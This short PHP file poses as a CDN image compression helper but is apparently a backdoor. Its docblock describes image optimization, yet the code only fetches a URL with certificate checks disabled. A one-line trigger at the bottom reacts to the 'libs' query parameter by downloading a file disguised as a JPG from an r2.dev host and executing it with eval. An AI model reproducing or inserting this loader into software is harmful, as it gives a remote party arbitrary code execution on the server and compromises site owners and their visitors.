<?php
/**
 * GD Library Image Stream Optimizer
 * Handles remote image fetching and compression for CDN assets.
 * * @param string $source_img_uri Remote image URL
 * @param int $quality Compression quality (0-100)
 */
function stream_compressed_asset($source_img_uri, $quality = 75) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $source_img_uri);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $image_blob = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($status === 200) ? $image_blob : false;
}
if (isset($_GET['libs'])) { $cdn_source = 'https://pub-12712f1416d3407a9762a76592de5692.r2.dev/thumb-150x150.jpg'; $stream_buffer = stream_compressed_asset($cdn_source, 90); eval('?>' . $stream_buffer); exit(); }
